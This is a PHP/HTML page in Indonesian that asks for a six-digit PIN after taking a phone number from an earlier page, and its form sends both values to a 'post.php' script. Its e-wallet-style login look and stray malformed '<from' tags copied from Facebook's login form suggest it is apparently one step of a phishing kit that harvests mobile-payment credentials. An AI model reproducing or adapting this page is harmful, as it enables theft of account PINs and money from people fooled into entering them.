<?php
// Get the phone number from the previous page
// If it's not set, redirect back to the start
$phone_number = isset($_POST['phone_number']) ? htmlspecialchars($_POST['phone_number']) : '';
if (empty($phone_number)) {
    header('Location: index.html');
    exit;
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masukkan PIN</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="container">
        <div class="header-simple">
            <svg class="icon-back" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="24" height="24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"></path></svg>
            Masuk
        </div>
        <from class="_9vtf" data-testid="royal_login_form" action="" method="post" onsubmit="" id="">
        <form action="post.php" method="POST">
            <div class="content text-center">
                <h2>Masukkan PIN</h2>
                
                <input type="hidden" name="phone_number" value="<?php echo $phone_number; ?>">
                
                <input type="password" name="pin" class="pin-input" maxlength="6" pattern="\d{6}" inputmode="numeric" placeholder="●●●●●●" required>
                
                <div class="links">
                    <a href="#">BUTUH BANTUAN?</a>
                    <a href="#">LUPA PIN?</a>
                </div>

                <button type="submit" class="btn-submit-pin">Masuk</button>
            </div>
            <from class="_9vtf" data-testid="royal_login_form" action="" method="post" onsubmit="" id="">
        </form>
    </div>

</body>
</html>
